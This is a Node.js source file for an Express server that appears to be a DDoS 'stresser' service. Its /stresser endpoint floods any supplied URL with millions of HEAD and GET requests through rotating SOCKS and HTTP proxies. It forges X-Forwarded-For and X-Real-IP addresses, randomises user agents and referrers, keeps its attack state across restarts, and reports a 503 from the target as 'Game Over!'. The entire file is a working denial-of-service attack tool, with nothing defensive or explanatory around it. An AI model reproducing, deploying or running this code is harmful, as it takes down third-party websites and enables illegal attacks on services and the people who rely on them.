const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, 'attackState.json');
const REQUESTS_PER_THREAD = 10000; // Number of requests per thread per batch
const numThreads = 1000; // Number of threads

const ensureStateFileExists = () => {
    if (!fs.existsSync(stateFilePath)) {
        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
    }
};

const loadState = () => {
    ensureStateFileExists();
    try {
        const data = fs.readFileSync(stateFilePath, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error(`Failed to read state file: ${error}`);
        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
    }
};

let state = loadState();
let continueAttack = state.continueAttack;
let startTime = state.startTime;
let duration = state.duration;
let targetUrl = state.targetUrl;

if (continueAttack && startTime && duration) {
    const endTime = startTime + duration;
    if (Date.now() > endTime) {
        continueAttack = false;
        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
        fs.writeFileSync(stateFilePath, JSON.stringify(state));
    }
}

const langHeaders = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en-gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-NZ,en;q=0.9",
    "en-ZA,en;q=0.9"
];

const referrers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords=",
    "https://net25.com/news"
];

const cipherSuites = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
    try {
        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
};

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return [];
    }
};

const performAttack = async (url, agent, threadId) => {
    if (!continueAttack) return;

    // Check if duration has expired
    if (startTime && duration) {
        const endTime = startTime + duration;
        if (Date.now() > endTime) {
            continueAttack = false;
            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
            fs.writeFileSync(stateFilePath, JSON.stringify(state));
            console.log(rainbow(`Attack duration expired. Stopping thread ${threadId}.`));
            return;
        }
    }

    const headersForRequest = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Cache-Control": getRandomElement(cipherSuites),
        "Referer": getRandomElement(referrers),
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "TE": "Trailers",
        "Accept-Encoding": "gzip, deflate, br",
        "Pragma": getRandomElement(cipherSuites),
        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        "Host": url.replace(/https?:\/\//, "").split("/")[0],
        "sec-fetch-site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Origin": url.split("/").slice(0, 3).join("/")
    };

    // Create an array of 10,000 HEAD and GET requests
    const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
        axios.head(url, { httpAgent: agent, headers: headersForRequest }),
        axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
    ]).flat();

    try {
        // Send all 10,000 requests simultaneously
        await Promise.allSettled(requests.map(request => request.catch(err => {
            if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
                // console.log(rainbow(`Thread ${threadId}: Unable to Attack Target Server Refused!`));
            } else if (err.response?.status === 404) {
                // console.log(rainbow(`Thread ${threadId}: Target returned 404 (Not Found).`));
            } else if (err.response?.status === 503) {
                console.log(rainbow(`Thread ${threadId}: Target under heavy load (503) - Game Over!`));
            } else if (err.response?.status === 502) {
                console.log(rainbow(`Thread ${threadId}: Bad Gateway (502).`));
            } else if (err.response?.status === 403) {
                // console.log(rainbow(`Thread ${threadId}: Forbidden (403).`));
            } else if (err.response?.status) {
                // console.log(rainbow(`Thread ${threadId}: DDOS Status: (${err.response?.status})`));
            } else {
                // console.log(rainbow(`Thread ${threadId}: ${err.message || "ATTACK FAILED!"}`));
            }
            return null; // Return null for failed requests
        })));

        console.log(rainbow(`Thread ${threadId}: Completed batch of ${REQUESTS_PER_THREAD * 2} requests.`));

        // Continue with the next batch if duration allows
        if (continueAttack) {
            setTimeout(() => performAttack(url, agent, threadId), 0);
        }
    } catch (err) {
        console.error(rainbow(`Thread ${threadId}: Batch failed: ${err.message}`));
        // Continue with the next batch even on error
        if (continueAttack) {
            setTimeout(() => performAttack(url, agent, threadId), 0);
        }
    }
};

const startAttack = (url, durationHours) => {
    if (!url || !/^https?:\/\//.test(url)) {
        console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
        return false;
    }

    const proxies = loadProxies();
    if (!proxies.length) {
        console.error("No proxies found. Please add proxies to the proxy file.");
        return false;
    }

    continueAttack = true;
    targetUrl = url;
    startTime = Date.now();
    duration = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds

    state = { continueAttack, startTime, duration, targetUrl };
    fs.writeFileSync(stateFilePath, JSON.stringify(state));

    const attackTimeout = setTimeout(() => {
        continueAttack = false;
        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
        fs.writeFileSync(stateFilePath, JSON.stringify(state));
        console.log(rainbow("Attack duration expired. All threads stopped."));
    }, duration);

    for (let i = 0; i < numThreads; i++) {
        if (!continueAttack) break;

        const randomProxy = getRandomElement(proxies);
        const proxyParts = randomProxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);

        performAttack(url, agent, i);
    }
    return true;
};

app.get("/stresser", async (req, res) => {
    const url = req.query.url;
    const durationHours = parseFloat(req.query.duration) || 1;

    if (!url || !/^https?:\/\//.test(url)) {
        return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
    }
    if (isNaN(durationHours) || durationHours <= 0) {
        return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
    }

    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD} requests per batch...` });
    startAttack(url, durationHours);
});

const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
app.listen(port, () => {
    console.log(rainbow(`API running on http://localhost:${port}`));
    if (continueAttack && startTime && duration && targetUrl) {
        console.log(rainbow('Resuming previous attack...'));
        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // Convert milliseconds back to hours
        if (remainingDuration > 0) {
            startAttack(targetUrl, remainingDuration);
        } else {
            continueAttack = false;
            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
            fs.writeFileSync(stateFilePath, JSON.stringify(state));
        }
    }
});